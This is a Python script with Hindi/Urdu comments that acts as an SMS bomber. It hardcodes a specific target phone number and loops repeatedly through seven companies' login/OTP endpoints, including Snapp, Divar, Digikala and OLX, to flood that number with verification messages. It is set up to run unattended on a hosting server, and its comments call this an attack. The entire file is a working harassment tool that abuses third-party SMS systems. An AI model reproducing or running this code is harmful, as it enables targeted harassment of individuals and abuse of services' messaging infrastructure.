import threading
import time
import re
import sys
from colorama import Fore, Style, init
import httpx

init(autoreset=True)

# ==========================================
# 👇 YAHAN APNI SETTINGS EDIT KAREIN 👇
# ==========================================
TARGET_COUNTRY = "91"        # Country Code (e.g., 91 for India, 98 for Iran)
TARGET_PHONE = "9103369975"  # Target Number (Bina Country Code ke)
MESSAGE_COUNT = 50           # Kitne SMS bhejne hain
DELAY = 1                    # Speed (Seconds mein)
# ==========================================

# --------- 1. Aapka Original API Code ---------
def send_sms_snapp(phone, country, proxy=None):
    try:
        phone_full = f"{country}{phone}"
        url = "https://api.snapp.ir/api/v1/sms/link"
        data = {"phone": phone_full}
        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            # Debugging ke liye status print kar rahe hain
            print(f"[Snapp] Status: {r.status_code}") 
            return r.status_code == 200 or r.status_code == 201
    except Exception as e:
        print(f"[Snapp] Error: {e}")
        return False

def send_sms_divar(phone, country, proxy=None):
    try:
        phone_full = f"{country}{phone}"
        url = "https://api.divar.ir/v5/auth/authenticate"
        data = {"phone": phone_full}
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            print(f"[Divar] Status: {r.status_code}")
            return r.status_code == 200
    except Exception as e:
        print(f"[Divar] Error: {e}")
        return False

def send_sms_banimode(phone, country, proxy=None):
    try:
        phone_full = f"{country}{phone}"
        url = "https://mobapi.banimode.com/api/v2/auth/request"
        data = {"phone": phone_full}
        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            print(f"[Banimode] Status: {r.status_code}")
            return r.status_code == 200 or r.status_code == 201
    except Exception as e:
        return False

def send_sms_alopeyk(phone, country, proxy=None):
    try:
        phone_full = f"{country}{phone}"
        url = "https://sandbox-api.alopeyk.com/api/v2/user/otp"
        data = {"phone": phone_full}
        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            print(f"[Alopeyk] Status: {r.status_code}")
            return r.status_code == 200 or r.status_code == 201
    except Exception:
        return False

def send_sms_digikala(phone, country, proxy=None):
    try:
        phone_full = f"0{phone}" if not phone.startswith("0") else phone
        url = "https://api.digikala.com/v1/user/authenticate/"
        data = {"username": phone_full}
        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            print(f"[Digikala] Status: {r.status_code}")
            return r.status_code == 200
    except Exception:
        return False

def send_sms_youla(phone, country, proxy=None):
    try:
        phone_full = f"+{country}{phone}"
        url = "https://youla.ru/web-api/auth/request_code"
        data = {"phone": phone_full}
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            print(f"[Youla] Status: {r.status_code}")
            return r.status_code == 200
    except Exception:
        return False

def send_sms_olx(phone, country, proxy=None):
    try:
        phone_full = f"+{country}{phone}"
        url = "https://www.olx.in/api/auth/authenticate"
        data = {"mobile": phone_full}
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            print(f"[OLX] Status: {r.status_code}")
            return r.status_code == 200
    except Exception:
        return False

# --------- API List (Original) ---------
SMS_APIS = [
    {"name": "Snapp", "func": send_sms_snapp},
    {"name": "Divar", "func": send_sms_divar},
    {"name": "Banimode", "func": send_sms_banimode},
    {"name": "Alopeyk", "func": send_sms_alopeyk},
    {"name": "Digikala", "func": send_sms_digikala},
    {"name": "Youla", "func": send_sms_youla},
    {"name": "OLX", "func": send_sms_olx}
]

# --------- 2. Automatic Runner (Render Fix) ---------
def start_automatic_process():
    print(f"{Fore.GREEN}\n[+] Render Started! Target: {TARGET_COUNTRY}{TARGET_PHONE}{Style.RESET_ALL}")
    
    # Check APIs Online Status (Bypass kar diya taaki error na aaye)
    # Seedha attack shuru karte hain
    
    sent_count = 0
    failed_count = 0

    for i in range(MESSAGE_COUNT):
        print(f"\n--- Round {i+1}/{MESSAGE_COUNT} ---")
        for api in SMS_APIS:
            try:
                # API Call bina input maange
                success = api["func"](TARGET_PHONE, TARGET_COUNTRY, None)
                
                if success:
                    sent_count += 1
                    print(Fore.GREEN + f"✅ [{api['name']}] Sent!" + Style.RESET_ALL)
                else:
                    failed_count += 1
                    print(Fore.RED + f"❌ [{api['name']}] Failed" + Style.RESET_ALL)
            except Exception as e:
                print(f"⚠️ Error in {api['name']}: {e}")
            
            time.sleep(0.5) # Chhota break har API ke beech
        
        time.sleep(DELAY) # Break har round ke baad

    print(f"{Fore.CYAN}\n[=] JOB DONE! Total Sent: {sent_count}, Failed: {failed_count}{Style.RESET_ALL}")

# --------- 3. Main Entry Point ---------
if __name__ == "__main__":
    print("Code is initializing on Render Server...")
    
    # 1. Process Start karo
    start_automatic_process()
    
    # 2. Render ko Zinda rakho (Important Step)
    # Agar ye nahi lagayenge to code khatam hote hi Render "Error/Crash" dikhayega
    print("\nProcess complete. Sleeping to keep server active...")
    while True:
        time.sleep(60)
